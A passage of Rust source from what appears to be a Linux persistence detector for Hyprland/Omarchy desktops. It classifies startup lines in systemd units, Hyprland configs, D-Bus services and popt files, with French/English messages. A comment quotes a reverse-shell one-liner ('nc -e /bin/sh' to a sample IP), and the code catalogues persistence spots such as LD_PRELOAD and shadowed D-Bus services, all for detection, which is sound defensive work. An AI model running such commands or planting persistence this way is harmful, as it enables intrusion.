                "{montre} est à plus de {PROFONDEUR_MAX} dossiers de profondeur : les modules qu'il contient ne sont pas lus, ce qu'ils lancent n'est pas vérifié",
                "{montre} is more than {PROFONDEUR_MAX} folders deep: the modules it holds are not read, what they start is not checked"
            ),
            trf!(
                "{montre} : un dossier de modules trop profond pour être lu ne peut pas être déclaré normal",
                "{montre}: a module folder too deep to be read cannot be declared normal"
            ),
        );
    }
    for f in masques.iter().filter(|f| !copies.iter().any(|(c, _)| c == *f)) {
        let montre = crate::ui::affichable(&t.r.montre(f));
        constat_sans_ligne(
            t,
            &format!("masque {}", t.r.montre(f)),
            trf!(
                "{montre} : le chargeur d'Omarchy prend ce module Lua avant celui du même nom (de la bibliothèque d'Omarchy ou de ~/.config/hypr) : ce qu'il fait remplace l'original ; ses lignes sont jugées ici aussi",
                "{montre}: Omarchy's loader takes this Lua module before the one with the same name (from Omarchy's library or ~/.config/hypr): what it does replaces the original; its lines are judged here too"
            ),
            trf!(
                "{montre} : un module qui en masque un autre ne peut pas être déclaré normal : retirez-le, ou mettez vos changements dans ~/.config/hypr",
                "{montre}: a module that masks another cannot be declared normal: remove it, or put your changes in ~/.config/hypr"
            ),
        );
    }
}

/// Les lignes signalées par la lecture de la persistance : critiques, suspectes, et d'où vient chacune (`source_de`,
/// sans langue ni numéro de ligne) : l'objet de l'alerte, qui change dès qu'une autre ligne ou une autre source
/// s'ajoute (accepter les lignes d'aujourd'hui ne tait jamais celles de demain, même dans un fichier déjà signalé).
#[derive(Default)]
struct Lancements {
    critiques: Vec<String>,
    suspects: Vec<String>,
    sources: Vec<String>,
    /// Pour chaque ligne signalée, le fichier et la ligne telle qu'écrite (fin « \r » comprise) qu'un geste de
    /// défense retirerait ; `None` : signalée ailleurs que dans un fichier (variable de la session, crontab du compte).
    retraits: Vec<Option<(String, String)>>,
    /// Pour chaque ligne signalée, ce qu'un choix « normal » lierait (`machine::temoins`), ou pourquoi on ne peut pas.
    temoins: Vec<Result<temoins::Temoin, temoins::Refus>>,
    /// Ce qui n'a pas été vu d'une ligne permise (`permise::Ecart::information` : disque de la sauvegarde débranché,
    /// réglages de popt du système à root), dit en information, jamais tu ni levé.
    informations: Vec<String>,
    r: Releveur,
}

/// Ce qu'il faut pour relever ce que désigne une ligne : la racine lue, le dossier personnel, le dossier de la
/// session (XDG_RUNTIME_DIR, où systemd range aussi des unités de l'utilisateur) et le budget du bilan.
#[derive(Default)]
struct Releveur {
    racine: std::path::PathBuf,
    maison: std::path::PathBuf,
    runtime: Option<std::path::PathBuf>,
    /// Le dossier de la session lu pour la détection : XDG_RUNTIME_DIR, sinon celui que systemd donne à ce compte
    /// (`/run/user/<uid>`). Les unités qu'il garde se lisent même quand la variable manque.
    session: Option<std::path::PathBuf>,
    /// XDG_CONFIG_HOME et XDG_DATA_HOME, s'ils mènent ailleurs que les dossiers par défaut du dossier personnel.
    config: Option<std::path::PathBuf>,
    donnees: Option<std::path::PathBuf>,
    /// ZDOTDIR, s'il mène ailleurs que le dossier personnel : zsh y lit .zshenv, .zprofile, .zshrc, .zlogin.
    zdot: Option<std::path::PathBuf>,
    /// XDG_STATE_HOME, s'il mène ailleurs que ~/.local/state : Omarchy y range ses bascules et ses dispositions.
    etat: Option<std::path::PathBuf>,
    /// Les modules Lua qu'Omarchy charge hors de ~/.config/hypr (`MODULES_D_OMARCHY`) : jugés comme ceux de
    /// ~/.config/hypr, sans pouvoir se déclarer normaux (deuxième vérification, N11).
    modules: Vec<std::path::PathBuf>,
    /// Les fichiers que Hyprland lit par « source = » hors de ses dossiers (`environnement`) : leurs lignes de
    /// lancement se jugent comme celles de ~/.config/hypr, sans pouvoir se déclarer normales (troisième vérification).
    hypr_inclus: Vec<std::path::PathBuf>,
    /// Les dossiers d'unités que systemd lit en plus des habituels (`Ajout::Dossier`), tels que lus sous la racine.
    dossiers_ajoutes: Vec<std::path::PathBuf>,
    /// Le dossier de session que systemd donne au compte (`/run/user/<uid>`), quand XDG_RUNTIME_DIR mène ailleurs : lu
    /// aussi (relecture adverse, B6), ses unités comme celles de `dossiers_ajoutes`.
    session_de_systemd: Option<std::path::PathBuf>,
    /// XDG_DATA_DIRS et XDG_CONFIG_DIRS (chemins absolus seulement), où systemd cherche aussi des unités.
    donnees_systeme: Vec<std::path::PathBuf>,
    config_systeme: Vec<std::path::PathBuf>,
    /// V-1 (relecture du lot c2-uwsm, 0.95) : les dossiers de la session où uwsm cherche « uwsm/env… », coupés comme il
    /// les coupe (XDG_CONFIG_HOME, XDG_CONFIG_DIRS et XDG_DATA_DIRS, à chaque « : », morceaux vides passés), un morceau
    /// relatif joint au dossier personnel (`depuis_la_maison`), que systemd, lui, ignore.
    uwsm_session: Vec<std::path::PathBuf>,
    /// Les dossiers que les fichiers du gestionnaire de systemd du compte posent par une `VARIABLES_DES_DOSSIERS`
    /// (relecture 0.95, V-1) : (variable, dossier), où systemd cherche aussi des unités (`dossiers_du_gestionnaire`).
    /// Étiquette `RELATIF_POUR_UWSM` : un morceau relatif, que systemd ignore et que seul `dossiers_d_uwsm` lit.
    gestionnaire: Vec<(&'static str, std::path::PathBuf)>,
    /// Ce qui ne s'y résout pas : (fichier ou dossier, variable) ; « ? » : il ne se lit pas en entier.
    gestionnaire_non_resolu: Vec<(std::path::PathBuf, String)>,
    /// Les lignes des fichiers d'environnement des sessions qui nomment une variable sensible (`environnement`), liées
    /// à chaque ligne déclarée normale ; `None` : pas relevées, donc rien ne se déclare.
    environnement: Option<Result<(String, temoins::Etat), temoins::Refus>>,
    budget: temoins::Budget,
    /// `dossiers_dbus`, calculés une fois (chacun jugé par `de_root_seul`).
    dbus: std::cell::OnceCell<Vec<std::path::PathBuf>>,
}

impl Releveur {
    /// Un fichier des dossiers de Hyprland (~/.config/hypr, ou celui d'un XDG_CONFIG_HOME déplacé).
    fn dans_hypr(&self, f: &Path) -> bool {
        f.starts_with(self.maison.join(".config/hypr"))
            || self
                .config
                .as_ref()
                .is_some_and(|c| f.starts_with(self.sous(&c.join("hypr"))))
    }

    /// `dans_hypr` par le chemin réel : le fichier lui-même, une fois ses liens suivis, est sous le dossier
    /// personnel réel (ou le XDG_CONFIG_HOME réel), puis « .config/hypr » (ou « hypr ») sans lien. Un lien (le
    /// fichier, ~/.config/hypr ou un sous-dossier) qui mène ailleurs en sort : la ligne vit hors de ~/.config/hypr.
    fn dans_hypr_reel(&self, f: &Path) -> bool {
        let Ok(reel) = std::fs::canonicalize(f) else {
            return false;
        };
        let sous_reel =
            |base: &Path, reste: &str| std::fs::canonicalize(base).is_ok_and(|b| reel.starts_with(b.join(reste)));
        sous_reel(&self.maison, ".config/hypr")
            || self.config.as_ref().is_some_and(|c| sous_reel(&self.sous(c), "hypr"))
    }

    /// Un fichier d'unités de l'utilisateur lu dans le dossier personnel, ou dans un XDG_CONFIG_HOME ou
    /// XDG_DATA_HOME déplacé : pas sous /etc/systemd/user, que seul root devrait écrire.
    fn du_compte(&self, f: &Path) -> bool {
        !f.starts_with(self.sous(Path::new("/etc/systemd/user")))
            && (f.starts_with(&self.maison)
                || [&self.config, &self.donnees]
                    .into_iter()
                    .flatten()
                    .any(|d| f.starts_with(self.sous(d))))
    }

    /// Les dossiers de services D-Bus de la session que le compte écrit (~/.local/share/dbus-1/services, et celui d'un
    /// XDG_DATA_HOME déplacé), tels que lus sous la racine : le bus y prend d'abord le programme d'un nom demandé.
    fn dossiers_dbus(&self) -> &[std::path::PathBuf] {
        self.dbus.get_or_init(|| self.calculer_dbus())
    }

    fn calculer_dbus(&self) -> Vec<std::path::PathBuf> {
        let mut d = vec![self.maison.join(".local/share/dbus-1/services")];
        d.extend(self.donnees.as_ref().map(|x| self.sous(&x.join("dbus-1/services"))));
        // Le bus de la session lit aussi XDG_RUNTIME_DIR/dbus-1/services et chaque XDG_DATA_DIRS/dbus-1/services
        // (vérification 3, P6) : ceux du dossier de session, et tout dossier de XDG_DATA_DIRS que root n'est pas seul
        // à pouvoir écrire (dossier personnel, temporaire, ouvert à tous).
        for s in [&self.runtime, &self.session, &self.session_de_systemd]
            .into_iter()
            .flatten()
        {
            d.push(self.sous(&s.join("dbus-1/services")));
        }
        for x in &self.donnees_systeme {
            let dossier = self.sous(&x.join("dbus-1/services"));
            if !de_root_seul(&dossier) {
                d.push(dossier);
            }
        }
        let mut vus = std::collections::BTreeSet::new();
        d.retain(|x| vus.insert(x.clone()));
        d
    }

    /// Un fichier du dossier de la session (XDG_RUNTIME_DIR/systemd) : unités et générateurs que systemd y range.
    fn de_la_session(&self, f: &Path) -> bool {
        self.session
            .as_ref()
            .is_some_and(|d| f.starts_with(self.sous(&d.join("systemd"))))
    }

    /// Un chemin absolu de l'ordinateur, lu sous la racine (une arborescence fabriquée pour les essais et le
    /// corpus) ; le dossier personnel y est déjà.
    fn sous(&self, chemin: &Path) -> std::path::PathBuf {
        if self.racine == Path::new("/") || chemin.starts_with(&self.racine) {
            chemin.to_path_buf()
        } else {
            self.racine.join(chemin.strip_prefix("/").unwrap_or(chemin))
        }
    }

    /// Un chemin lu, tel qu'il se montre et se lie : « ~/… » dans le dossier personnel (le même fichier pour le
    /// même compte), sinon absolu, sans la racine fabriquée. Pas nettoyé ici (`court`) : le témoin lie le chemin
    /// exact et ne nettoie que ce qu'il montre.
    fn montre(&self, lu: &Path) -> String {
        if let Ok(r) = lu.strip_prefix(&self.maison) {
            return format!("~/{}", r.to_string_lossy());
        }
        if self.racine != Path::new("/")
            && let Ok(r) = lu.strip_prefix(&self.racine)
        {
            return format!("/{}", r.to_string_lossy());
        }
        lu.to_string_lossy().into_owned()
    }
}

/// Où se trouve une ligne de démarrage : la façon de lire sa commande en dépend (`designes::Contexte`).
#[derive(Clone, Copy, PartialEq, Eq)]
enum Sorte {
    /// Une unité systemd, de l'utilisateur ou du système.
    Unite {
        utilisateur: bool,
    },
    Bureau,
    Shell,
    /// Un lancement que la détection voit depuis ce lot, sans qu'il puisse être déclaré normal (`hors_du_perimetre`).
    Ajoutee(Ajout),
}

/// Les lancements vus par le lot de détection de la persistance : levés comme les autres, jamais déclarables.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Ajout {
    /// Une ligne d'unité (ou de .desktop, `bureau`) faite de plusieurs lignes écrites, jointes comme systemd les
    /// joint (« \ » en fin de ligne), ou coupée par une fin de ligne que seul systemd voit (« \r », « \0 »).
    Jointe { bureau: bool, utilisateur: bool },
    /// Une unité du dossier de la session (XDG_RUNTIME_DIR/systemd) : systemd et les programmes du compte l'écrivent.
    Session,
    /// Un raccourci de Hyprland qui lance une commande (« bind… = …, exec, … »), ou un appel Lua qui en lance une.
    Raccourci,
    /// Un lancement de Hyprland précédé de règles (« exec-once = [workspace 2] … »).
    LancementHypr,
    /// Un générateur de systemd, lancé à chaque démarrage de la session (pas une ligne : un programme).
    Generateur,
    /// Une ligne de Hyprland faite de plusieurs lignes écrites, jointes par « \\ » en fin de ligne comme hyprlang.
    JointeHypr,
    /// Une clé de Hyprland qui charge ou lance (« plugin = », hypridle), une variable qui fait du bouton « exec », ou
    /// un appel Lua dont la commande ne se lit pas : ce qui se lance ne se lie pas à la ligne.
    CleHypr,
    /// Un réglage d'unité qui change ce qui se lance sans ligne Exec (Environment=LD_PRELOAD…, ExecSearchPath=).
    Reglage,
    /// Une unité d'un dossier que systemd lit aussi (user.attached, XDG_DATA_DIRS, XDG_CONFIG_DIRS, le dossier de
    /// session de systemd quand XDG_RUNTIME_DIR mène ailleurs).
    Dossier,
    /// Un service D-Bus de la session écrit par le compte (~/.local/share/dbus-1/services/*.service) : sa ligne
    /// « Exec= » se lance quand un programme demande ce nom sur le bus (vérification 2, mineurs), avant le service du
    /// même nom du système.
    DBus,
    /// Une ligne « `<programme> exec <option> <commande>` » d'un réglage de popt du compte (~/.popt, ou /etc/popt,
    /// /usr/etc/popt et leurs popt.d que le compte peut changer) : rsync, et tout programme qui lit ces réglages,
    /// lance `<commande>` à la place de lui-même quand il reçoit `<option>` (popt(3), « exec »).
    Popt,
}

impl Sorte {
    fn de(f: &Path, r: &Releveur) -> Sorte {
        if r.de_la_session(f) {
            Sorte::Ajoutee(Ajout::Session)
        } else if r.dossiers_ajoutes.iter().any(|d| f.starts_with(d)) {
            Sorte::Ajoutee(Ajout::Dossier)
        } else if r.dossiers_dbus().iter().any(|d| f.starts_with(d)) {
            Sorte::Ajoutee(Ajout::DBus)
        } else if a_l_extension(f, "desktop") {
            Sorte::Bureau
        } else if r.dans_hypr(f) || r.hypr_inclus.iter().any(|h| h == f) || a_l_extension(f, "lua") {
            Sorte::Shell
        } else {
            Sorte::Unite {
                utilisateur: !f.starts_with(r.sous(Path::new("/etc/systemd/system"))),
            }
        }
    }

    fn contexte(self, maison: &str) -> designes::Contexte<'_> {
        match self {
            Sorte::Unite { utilisateur: true }
            | Sorte::Ajoutee(
                Ajout::Jointe {
                    bureau: false,
                    utilisateur: true,
                }
                | Ajout::Session
                | Ajout::Dossier
                | Ajout::DBus
                | Ajout::Reglage,
            ) => designes::Contexte::Unite(Some(maison)),
            Sorte::Unite { utilisateur: false }
            | Sorte::Ajoutee(Ajout::Jointe {
                bureau: false,
                utilisateur: false,
            }) => designes::Contexte::Unite(None),
            Sorte::Bureau | Sorte::Ajoutee(Ajout::Jointe { bureau: true, .. }) => designes::Contexte::Bureau,
            Sorte::Shell
            | Sorte::Ajoutee(
                Ajout::Raccourci
                | Ajout::LancementHypr
                | Ajout::Generateur
                | Ajout::JointeHypr
                | Ajout::CleHypr
                | Ajout::Popt,
            ) => designes::Contexte::Shell,
        }
    }
}

/// Pourquoi une ligne ne dit pas sans ambiguïté ce qu'elle lance, prêt à suivre « la ligne « … » ».
fn raison_du_flou(f: designes::Flou) -> &'static str {
    use designes::Flou;
    match f {
        Flou::Syntaxe => tr!(
            "ne dit pas sans ambiguïté ce qu'elle lance (variable, sous-commande, tube, joker, guillemet ou code de systemd)",
            "does not say unambiguously what it starts (variable, subcommand, pipe, wildcard, quote or systemd specifier)"
        ),
        Flou::Blanc => tr!(
            "contient un blanc inhabituel ou un caractère invisible : l'écran ne la montre pas telle qu'elle se lit",
            "contains an unusual space or an invisible character: the screen does not show it the way it is read"
        ),
        Flou::Octet => tr!(
            "contient un octet qui n'est pas du texte (UTF-8) : ce qui se montre ne serait pas ce qui se lance",
            "contains a byte that is not text (UTF-8): what is shown would not be what is started"
        ),
        Flou::Argument => tr!(
            "donne un mot sans chemin à un programme non reconnu : Vanguard ne peut pas savoir ce qu'il lit",
            "gives a word without a path to an unrecognized program: Vanguard cannot know what it reads"
        ),
        Flou::Processus => tr!(
            "nomme un chemin par /proc, /dev, « . » ou « .. » : le fichier désigné dépend du programme qui le lit",
            "names a path through /proc, /dev, “.” or “..”: the file it names depends on the program that reads it"
        ),
        Flou::Relatif => tr!(
            "nomme un chemin relatif, qui dépend du dossier courant",
            "names a relative path, which depends on the current folder"
        ),
        Flou::NomNu => tr!(
            "nomme son programme sans chemin : il est cherché dans le PATH au lancement",
            "names its program without a path: it is looked up in PATH at launch"
        ),
        Flou::Maison => tr!(
            "désigne le dossier personnel par une variable (~, $HOME), qu'un autre fichier peut changer",
            "refers to the home folder through a variable (~, $HOME) that another file can change"
        ),
        Flou::Interprete => tr!(
            "lance un interpréteur sans script lié (code dans la ligne, module, entrée standard)",
            "starts an interpreter without a bound script (inline code, module, standard input)"
        ),
        Flou::Lanceur => tr!(
            "passe par un lanceur (env, nohup, sudo…) qui lance une autre commande",
            "goes through a launcher (env, nohup, sudo…) that starts another command"
        ),
        Flou::Option => tr!(
            "colle un chemin à une option, une forme qui n'est pas suivie",
            "glues a path to an option, a form that is not tracked"
        ),
        Flou::Trop => tr!(
            "désigne trop de fichiers, ou un chemin trop long",
            "names too many files, or a path that is too long"
        ),
        Flou::Vide => tr!("ne désigne aucun fichier", "names no file"),
    }
}

/// Les fichiers que désigne une ligne (`designes`), relevés sous la racine ; `commande` : une commande lancée, dont le
/// premier est le programme (sinon, des bibliothèques préchargées). `Err` : la ligne a la forme d'une porte dérobée,
/// ne dit pas sans ambiguïté ce qu'elle lance, lance une copie d'un interpréteur sous un autre nom, ou l'un d'eux ne
/// se relève pas.
fn cibles(
    r: &mut Releveur,
    d: Designe,
    ligne: &str,
    commande: bool,
) -> Result<Vec<(String, temoins::Etat)>, temoins::Refus> {
    // Exclue par sa raison, pas par sa syntaxe : « nc -e /bin/sh 192.0.2.7 4444 » se lit sans ambiguïté.
    if raison_grave(ligne).is_some() {
        return Err(temoins::Refus(
            tr!(
                "cette ligne a la forme d'une porte dérobée (shell inversé, script téléchargé ou caché) : elle ne se déclare jamais normale",
                "this line has the shape of a backdoor (reverse shell, downloaded or hidden script): it can never be declared normal"
            )
            .to_string(),
        ));
    }
    let chemins = match d {
        Designe::Chemins(c) => c,
        Designe::Indefini(flou) => {
            return Err(temoins::Refus(trf!(
                "la ligne « {} » {}",
                "the line “{}” {}",
                crate::ui::couper(&crate::ui::affichable(ligne.trim()), 80),
                raison_du_flou(flou)
            )));
        }
    };
    if commande && let Some(programme) = chemins.first() {
        copie_d_un_interprete(r, programme)?;
    }
    let mut sortie = Vec::with_capacity(chemins.len());
    for (i, c) in chemins.into_iter().enumerate() {
        let lu = r.sous(Path::new(&c));
        let montre = r.montre(&lu);
        // Seul le programme (ou une bibliothèque préchargée) peut être un binaire : tout autre fichier est lu par un
        // interpréteur, et doit se montrer comme il s'exécute (vérification de la campagne E, N4).
        let programme = !commande || i == 0;
        sortie.push((montre, temoins::etat_de_la_cible(&lu, programme, &mut r.budget)?));
    }
    Ok(sortie)
}

/// Les dossiers où se trouvent les interpréteurs et les lanceurs du système, à comparer à un programme inconnu.
const DOSSIERS_DES_INTERPRETES: [&str; 4] = ["/usr/bin", "/bin", "/usr/local/bin", "/usr/sbin"];

/// Un programme qui n'est ni un interpréteur ni un lanceur par son nom, mais dont le contenu est celui d'un
/// interpréteur ou d'un lanceur du système (une copie ou un lien dur sous un autre nom) : ses options (« -mmodule »,
/// « -fMakefile ») lui font lire des fichiers que rien ne lie, et la ligne ne se déclare pas. Comparé d'abord par
/// appareil et numéro, puis par taille, et seulement à taille égale par le contenu (`Err` : c'en est une copie).
fn copie_d_un_interprete(r: &mut Releveur, programme: &str) -> Result<(), temoins::Refus> {
    use std::os::unix::fs::MetadataExt as _;
    if designes::lit_un_script(programme) {
        return Ok(());
    }
    let lu = r.sous(Path::new(programme));
    let Ok(m) = std::fs::metadata(&lu) else {
        return Ok(());
    };
    if !m.is_file() {
        return Ok(());
    }
    let mut contenu: Option<[u8; 32]> = None;
    for d in DOSSIERS_DES_INTERPRETES {
        for e in std::fs::read_dir(r.sous(Path::new(d))).into_iter().flatten().flatten() {
            let nom = e.file_name();
            let Some(nom) = nom.to_str() else { continue };
            if !designes::lit_un_script(nom) {
                continue;
            }
            let Ok(autre) = std::fs::metadata(e.path()) else {
                continue;
            };
            if !autre.is_file() || autre.len() != m.len() {
                continue;
            }
            let copie = (autre.dev() == m.dev() && autre.ino() == m.ino())
                || {
                    let soi = match contenu {
                        Some(c) => Some(c),
                        None => empreinte_bornee(&lu, &mut r.budget),
                    };
                    contenu = soi;
                    // Un contenu qui ne se compare pas (illisible, budget du bilan épuisé) n'est pas « pas une copie » :
                    // dans le doute, refusé (deuxième vérification de la campagne E).
                    match (soi, empreinte_bornee(&e.path(), &mut r.budget)) {
                        (Some(a), Some(b)) => a == b,
                        _ => {
                            return Err(temoins::Refus(trf!(
                                "{} ne se compare pas à {} (illisible, ou trop de fichiers relus pour ce bilan) : ce pourrait en être une copie",
                                "{} cannot be compared with {} (unreadable, or too many files re-read for this check): it could be a copy of it",
                                crate::ui::affichable(&r.montre(&lu)),
                                crate::ui::affichable(&format!("{d}/{nom}"))
                            )));
                        }
                    }
                };
            if copie {
                return Err(temoins::Refus(trf!(
                    "{} est une copie de {} sous un autre nom : ses options lui font lire des fichiers que Vanguard ne suit pas",
                    "{} is a copy of {} under another name: its options make it read files that Vanguard does not track",
                    crate::ui::affichable(&r.montre(&lu)),
                    crate::ui::affichable(&format!("{d}/{nom}"))
                )));
            }
        }
    }
    Ok(())
}

/// Le BLAKE3 d'un fichier ordinaire pris sur le budget du bilan ; `None` : illisible ou budget épuisé.
fn empreinte_bornee(chemin: &Path, budget: &mut temoins::Budget) -> Option<[u8; 32]> {
    let m = std::fs::metadata(chemin).ok()?;
    if !budget.prendre(m.len()) {
        return None;
    }
    let lu = temoins::lire_borne(chemin, m.len()).ok()?;
    lu.entier.then(|| *blake3::hash(&lu.octets).as_bytes())
}

/// Au-delà de `TEMOINS_MAX` lignes, l'alerte ne se déclare pas : les suivantes ne sont pas relues.
fn place(t: &Lancements) -> Result<(), temoins::Refus> {
    if t.temoins.len() >= temoins::TEMOINS_MAX {
        return Err(temoins::Refus(trf!(
            "plus de {} lignes signalées, plus que celles qui se montrent avant un tel choix",
            "more than {} reported lines, more than can be shown before such a choice",
            temoins::TEMOINS_MAX
        )));
    }
    Ok(())
}

/// Au plus autant d'octets lus dans un fichier de démarrage ou de configuration.
const LECTURE_MAX: u64 = 32 * 1024 * 1024;

/// Un fichier de démarrage ou de configuration lu : ses octets (liés par un choix), son texte (jugé ; un octet qui
/// n'est pas de l'UTF-8 ne fait plus sauter le fichier), et s'il a été lu en entier.
struct Lecture {
    octets: Vec<u8>,
    texte: String,
    entier: bool,
}

/// Lit un fichier de démarrage ou de configuration, borné (`temoins::lire_borne` : jamais un tube, un périphérique
/// ni plus de `LECTURE_MAX` octets). Ce qui ne se lit pas en entier, ou un tube nommé à la place du fichier, est dit
/// dans l'alerte, jamais compté comme sain ; absent ou interdit de lecture, il est sauté comme avant.
fn lire(f: &Path, h: &Path, t: &mut Lancements) -> Option<Lecture> {
    match temoins::lire_borne(f, LECTURE_MAX) {
        Ok(lu) => {
            if !lu.entier {
                non_lu(
                    f,
                    h,
                    t,
                    tr!("trop gros pour être lu en entier", "too large to be read in full"),
                );
            }
            Some(Lecture {
                texte: String::from_utf8_lossy(&lu.octets).into_owned(),
                entier: lu.entier,
                octets: lu.octets,
            })
        }
        Err(_) if std::fs::metadata(f).is_ok_and(|m| std::os::unix::fs::FileTypeExt::is_fifo(&m.file_type())) => {
            non_lu(
                f,
                h,
                t,
                tr!("tube nommé à la place d'un fichier", "named pipe instead of a file"),
            );
            None
        }
        Err(_) => None,
    }
}

/// Un fichier de démarrage ou de configuration qui ne se lit pas en entier : une ligne de l'alerte.
fn non_lu(f: &Path, h: &Path, t: &mut Lancements, raison: &str) {
    t.sources
        .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), "non lu"));
    t.retraits.push(None);
    t.temoins.push(Err(temoins::Refus(trf!(
        "{} ne se lit pas en entier",
        "{} cannot be read in full",
        court(f, h)
    ))));
    t.suspects.push(trf!(
        "{} : {raison}, non vérifié",
        "{}: {raison}, not checked",
        court(f, h)
    ));
}

/// Le témoin d'une ligne `l` (numéro `n`, à partir de 0) du fichier `f`, dont `lu` est le contenu ; pour une ligne
/// d'unité systemd, aussi ce qui change l'unité sans toucher à la ligne (`unite`). `commande` : `designe` vient d'une
/// commande lancée (sinon, d'un préchargement : `cibles`).
#[allow(clippy::too_many_arguments)]
fn temoin_de_ligne(
    t: &mut Lancements,
    fichier: &Path,
    n: usize,
    lu: &Lecture,
    ligne: &str,
    designe: Designe,
    commande: bool,
    sorte: Sorte,
) -> Result<temoins::Temoin, temoins::Refus> {
    if let Some(refus) = hors_du_perimetre(&t.r, fichier, n.saturating_add(1), ligne, sorte, commande) {
        return Err(refus);
    }
    place(t)?;
    // Un octet qui n'est pas de l'UTF-8, dans le fichier ou son chemin : lu « avec pertes », il se montrerait et se
    // suivrait autrement que le lanceur, qui garde l'octet tel quel.
    if std::str::from_utf8(&lu.octets).is_err() || fichier.to_str().is_none() {
        return Err(octet_refuse(&court(fichier, &t.r.maison)));
    }
    if !t.r.maison.is_absolute() {
        return Err(temoins::Refus(
            tr!("le dossier personnel est inconnu", "the home folder is unknown").to_string(),
        ));
    }
    let mut cibles = cibles(&mut t.r, designe, ligne, commande)?;
    if !lu.entier {
        return Err(temoins::Refus(trf!(
            "{} ne se lit pas en entier",
            "{} cannot be read in full",
            court(fichier, &t.r.maison)
        )));
    }
    if let Sorte::Unite { utilisateur } = sorte {
        cibles.extend(unite(&mut t.r, fichier, &lu.texte, utilisateur, Some(ligne))?);
    }
    cibles.push(environnement_lie(&t.r)?);
    let numero = n.saturating_add(1);
    Ok(temoins::temoin(
        &format!("{}:{numero}", fichier.to_string_lossy()),
        format!("{}:{numero}", court(fichier, &t.r.maison)),
        ligne,
        Some(&temoins::etat_du_contenant(fichier, &lu.octets)?),
        &cibles,
    ))
}

/// Le périmètre de ce qui se déclare normal (décision de l'auteur, 10 nov. 2026) : une ligne d'une unité systemd de
/// l'utilisateur (la liste fermée de `directive_refusee`, chaque ligne Exec liée ; sous /etc/systemd/user, à root
/// seul) ou une ligne de lancement d'un fichier de ~/.config/hypr par son chemin réel. Tout le reste reste levé jusqu'au retrait de la ligne : un profil de shell, un fichier
/// de variables, une ligne de Hyprland qui pose une variable ou vient d'un fichier inclus ailleurs, et ce qui n'a pas
/// de lien sûr à son effet (.desktop, cron, préchargement, unité du système). La détection, elle, reste entière.
fn hors_du_perimetre(
    r: &Releveur,
    fichier: &Path,
    numero: usize,
    ligne: &str,
    sorte: Sorte,
    commande: bool,
) -> Option<temoins::Refus> {
    let ou = crate::ui::affichable(&court(fichier, &r.maison));
    let hypr = r.dans_hypr(fichier);
    match sorte {
        Sorte::Ajoutee(ajout) => Some(refus_ajoute(ajout, &ou, numero, ligne)),
        Sorte::Unite { utilisateur: true } if r.du_compte(fichier) || de_root_seul(fichier) => None,
        Sorte::Unite { utilisateur: true } => Some(temoins::Refus(trf!(
            "{ou}:{numero} : une unité de /etc/systemd/user que le compte peut changer (le fichier ou un dossier de son chemin n'est pas à root seul) ne peut pas être déclarée normale : rendez-la à root ou retirez la ligne",
            "{ou}:{numero}: a unit in /etc/systemd/user that the account can change (the file or a folder of its path is not root-only) cannot be declared normal: give it back to root or remove the line"
        ))),
        // Un module qu'Omarchy charge hors de ~/.config/hypr (état, thème, ou qui en masque un autre) : jamais
        // déclarable (deuxième vérification, N11).
        Sorte::Shell if r.modules.iter().any(|m| m == fichier) => Some(temoins::Refus(trf!(
            "{ou}:{numero} : une ligne d'un module Lua qu'Omarchy charge hors de ~/.config/hypr (état, thème) ne peut pas être déclarée normale : retirez la ligne, ou mettez-la dans ~/.config/hypr",
            "{ou}:{numero}: a line of a Lua module Omarchy loads outside ~/.config/hypr (state, theme) cannot be declared normal: remove the line, or put it in ~/.config/hypr"
        ))),
        Sorte::Shell if commande && hypr && !r.dans_hypr_reel(fichier) => Some(temoins::Refus(trf!(
            "{ou}:{numero} : ce fichier de Hyprland est lu par un lien qui mène hors de ~/.config/hypr (le fichier, le dossier ou un sous-dossier) : il ne peut pas être déclaré normal ; remplacez le lien par le fichier lui-même",
            "{ou}:{numero}: this Hyprland file is read through a link that leads outside ~/.config/hypr (the file, the folder or a subfolder): it cannot be declared normal; replace the link with the file itself"
        ))),
        // Un fichier lu par « source = » sans être un .conf de ~/.config/hypr (« extra.inc », ou hors du dossier) :
        // jamais déclarable, même sous ~/.config/hypr (relecture adverse, C6).
        Sorte::Shell if r.hypr_inclus.iter().any(|h| h == fichier) => Some(temoins::Refus(trf!(
            "{ou}:{numero} : une ligne d'un fichier que Hyprland lit par « source » (hors de ~/.config/hypr, ou qui n'y est pas un .conf) ne peut pas être déclarée normale : retirez ou déplacez la ligne",
            "{ou}:{numero}: a line of a file Hyprland reads through “source” (outside ~/.config/hypr, or not a .conf there) cannot be declared normal: remove or move the line"
        ))),
        Sorte::Shell if commande && hypr => None,
        Sorte::Shell if hypr || r.hypr_inclus.iter().any(|h| h == fichier) => Some(temoins::Refus(trf!(
            "{ou}:{numero} : une ligne de Hyprland qui pose une variable, ou d'un fichier inclus hors de ~/.config/hypr, ne peut pas être déclarée normale : retirez ou déplacez la ligne",
            "{ou}:{numero}: a Hyprland line that sets a variable, or from a file included outside ~/.config/hypr, cannot be declared normal: remove or move the line"
        ))),
        Sorte::Shell
            if !fichier.starts_with(r.sous(Path::new("/etc/cron.d")))
                && fichier != r.sous(Path::new("/etc/crontab"))
                && fichier != r.sous(Path::new("/etc/ld.so.preload")) =>
        {
            Some(temoins::Refus(trf!(
                "{ou}:{numero} : une ligne d'un profil de shell ou d'un fichier de variables de démarrage (environment.d, réglages de systemd) ne peut pas être déclarée normale : retirez ou déplacez la ligne",
                "{ou}:{numero}: a line of a shell profile or of a startup variable file (environment.d, systemd settings) cannot be declared normal: remove or move the line"
            )))
        }
        _ => Some(hors_des_deux(&format!("{ou}:{numero}"))),
    }
}

/// La clé d'une ligne de réglage d'unité, telle qu'à montrer : « Clé= », et pour « Environment= » la première
/// variable hors des permises (`variable_permise`, `valeur_permise`), sinon la première posée : « Environment=NOM ».
/// Écrite par qui a posé la ligne : rendue affichable et coupée.
fn cle_de_reglage(ligne: &str) -> String {
    let montre = |t: &str| crate::ui::couper(&crate::ui::affichable(t), 40);
    let Some((cle, valeur)) = ligne.split_once('=') else {
        return montre(ligne.trim_matches([' ', '\t']));
    };
    let cle = cle.trim_matches([' ', '\t']);
    if cle != "Environment" {
        return format!("{}=", montre(cle));
    }
    let mots = mots_de_systemd(valeur.trim_matches([' ', '\t'])).unwrap_or_default();
    let variables: Vec<(&str, &str)> = mots.iter().filter_map(|m| m.split_once('=')).collect();
    let nom = variables
        .iter()
        .find(|(n, v)| !variable_permise(n) || !valeur_permise(n, v))
        .or_else(|| variables.first())
        .map_or("", |(n, _)| n);
    format!("{cle}={}", montre(nom))
}

